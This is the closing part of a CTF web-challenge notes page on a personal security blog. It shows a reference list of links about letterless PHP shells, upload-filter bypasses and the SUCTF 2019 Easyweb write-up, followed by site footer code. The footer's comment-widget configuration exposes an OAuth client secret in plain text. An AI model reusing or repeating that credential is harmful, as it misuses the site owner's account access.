<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5677">https://xz.aliyun.com/t/5677</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">https://xz.aliyun.com/t/4720</a></p>
<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/">https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/</a></p>
<p>[<a target="_blank" rel="noopener" href="https://github.com/team-su/SUCTF-2019/blob/master/Web/easyweb/wp/SUCTF%202019%20Easyweb.md]">https://github.com/team-su/SUCTF-2019/blob/master/Web/easyweb/wp/SUCTF%202019%20Easyweb.md]</a>(<a target="_blank" rel="noopener" href="https://github.com/team-su/SUCTF-2019/blob/master/Web/easyweb/wp/SUCTF">https://github.com/team-su/SUCTF-2019/blob/master/Web/easyweb/wp/SUCTF</a> 2019 Easyweb.md)</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12250386.html">https://www.cnblogs.com/wangtanzhi/p/12250386.html</a></p>
<p><a target="_blank" rel="noopener" href="https://thibaud-robin.fr/articles/bypass-filter-upload/">https://thibaud-robin.fr/articles/bypass-filter-upload/</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/72e3.html">https://hack-for.fun/72e3.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><div class="social-share pull-right" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/3962.html"><i class="fa fa-chevron-left">  </i><span>BUU Web 刷题笔记5</span></a></div><div class="next-post pull-right"><a href="/f9a3.html"><span>BUU Web 刷题笔记4</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: '6ceed9c245da8d33222a',
  clientSecret: '143c0add0301972b963c8f672bf4e58a092673fb',
  repo: 'Gitalk',
  owner: 'ifonly-go2019',
  admin: 'ifonly-go2019',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By m0nk3y</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>